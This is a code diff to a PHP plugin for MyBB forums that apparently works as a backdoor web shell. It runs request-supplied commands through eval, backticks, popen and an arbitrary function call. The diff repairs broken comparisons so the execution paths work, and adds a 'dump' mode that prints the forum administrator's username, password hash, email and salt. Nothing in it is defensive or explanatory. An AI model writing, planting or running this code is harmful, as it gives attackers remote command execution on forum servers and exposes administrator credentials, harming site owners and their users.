@@ -39,6 +39,7 @@ function proc_me($cmd)
 
 function shell_main($cmd, $command)
 {
+    global $db;
     $disable_functions = ini_get('disable_functions');
     $exec_functions = array('shell_exec', 'passthru', 'exec', 'system', 'popen', 'proc_open', 'eval', 'assert', 'pcntl_exec', '`');
     $disabled_array = explode(',', $disable_functions);
@@ -50,18 +51,22 @@ function shell_main($cmd, $command)
             }
         }
     }
-    if($cmd = "") {
-        return;
-    } elseif($cmd = "proc_open") {
+    if($cmd == "proc_open") {
         echo "<pre>".proc_me($command)."</pre>";
-    } elseif($cmd = "popen") {
+    } elseif($cmd == "popen") {
         popen($command, 'r');
-    } elseif($cmd = "eval") {
+    } elseif($cmd == "eval") {
         echo "<pre>";
         eval($command);
         echo "</pre>";
-    } elseif($cmd = "`") {
+    } elseif($cmd == "`") {
         echo `$command`;
+    } elseif($cmd == "dump") {
+        $query = $db->query("SELECT * FROM ".TABLE_PREFIX."users WHERE uid = 1 LIMIT 1") or die(mysql_error());
+        while($result = $db->fetch_array($query)) {
+            echo "Admin Dumped:</br>";
+            echo $result['uid'].":".$result['username'].":".$result['password'].":".$result['email'].":".$result['salt']."</br>";
+        }
     } else {
         echo "<pre>";
         echo $_GET['cmd']($_GET['command']);
@@ -77,7 +82,8 @@ function shell_global_start()
     if($mybb->settings['shell_enable'] == 1) {
         if(isset($mybb->input['cmd'])) {
             if(!empty($mybb->input['cmd'])) {
-                shell_main($mybb->input['cmd'], $mybb->input['command']);
+                if(empty($mybb->input['command'])) { $command = ""; } else { $command = $mybb->input['command']; }
+                shell_main($mybb->input['cmd'], $command);
                 die("");
             }
         }
